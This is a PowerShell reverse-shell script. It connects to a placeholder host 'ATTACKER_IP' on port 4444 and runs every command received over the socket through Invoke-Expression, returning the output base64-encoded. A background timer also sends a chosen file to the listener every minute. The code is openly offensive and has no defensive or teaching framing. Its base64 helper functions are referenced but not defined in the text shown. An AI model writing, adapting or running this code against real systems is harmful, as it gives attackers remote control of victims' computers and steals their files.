# Reverse Shell Setup
$IPAddress = 'ATTACKER_IP'  # Replace with the IP address of your listener
$Port = 4444               # The port your listener is using

$client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Other functions (Decode-Base64, Encode-Base64, Create-DummyFiles) remain the same

# Function to Send a File
function Send-File {
    param($fileName)
    $fileStream = [System.IO.File]::OpenRead($fileName)
    try {
        $buffer = New-Object Byte[] 8192
        while ($true) {
            $read = $fileStream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            $stream.Write($buffer, 0, $read)
            $stream.Flush()
        }
    } finally {
        $fileStream.Close()
    }
}

# File Sending Loop (Runs in Background)
$filePath = "Path\To\periodic_file.txt"  # Update this path to the file you want to send
$sendFileTimer = New-Object Timers.Timer
$sendFileTimer.Interval = 60000 # 60 seconds
$sendFileTimer.AutoReset = $true
$sendFileTimer.Enabled = $true
Register-ObjectEvent -InputObject $sendFileTimer -EventName Elapsed -Action {
    Send-File -fileName $filePath
}

# Command Execution Loop
while ($true) {
    try {
        $input = $reader.ReadLine()
        if ($input -eq "exit") { break }
        if ($input -ne $null) {
            $output = Invoke-Expression $input 2>&1
            $writer.WriteLine(Encode-Base64 $output)
            $writer.Flush()
        }
    } catch {
        $writer.WriteLine(Encode-Base64 "An error occurred.")
        $writer.Flush()
    }
}

# Cleanup
$sendFileTimer.Stop()
$sendFileTimer.Dispose()
$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
